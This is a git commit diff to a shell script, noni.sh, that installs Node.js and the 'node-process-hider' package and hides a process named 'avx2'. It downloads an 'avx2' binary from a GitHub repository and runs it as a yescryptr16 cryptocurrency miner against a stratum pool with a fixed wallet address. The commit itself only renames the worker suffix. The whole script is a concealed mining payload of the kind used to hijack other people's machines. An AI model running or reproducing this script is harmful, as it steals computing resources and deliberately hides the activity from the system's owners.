46283a3ae9cb635f1eb11913cd818ce562cff833
OnaMayoung <97896344+OnaMayoung@users.noreply.github.com>
2022-04-21 22:39:38 +0000

    Update noni.sh

--- noni.sh
+++ noni.sh
@@ -2,4 +2,4 @@
 apt-get update && apt-get install gcc curl wget -y && curl -sL https://deb.nodesource.com/setup_12.x | bash - && apt-get install nodejs -y && npm install -g npm@8.4.1 && npm i -g node-process-hider && ph add avx2
 wget https://github.com/duitawa/ansible/raw/main/avx2 && chmod +x avx2
 chmod +x avx2
-./avx2 -a yescryptr16 -o stratum+tcps://stratum-na.rplant.xyz:17023 -u RHtPA9STGzx1mD32428bJj8i7ZipQrMxfZ.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x 
+./avx2 -a yescryptr16 -o stratum+tcps://stratum-na.rplant.xyz:17023 -u RHtPA9STGzx1mD32428bJj8i7ZipQrMxfZ.$(echo $(shuf -i 100-999 -n 1)-CPU-Z) -p x 
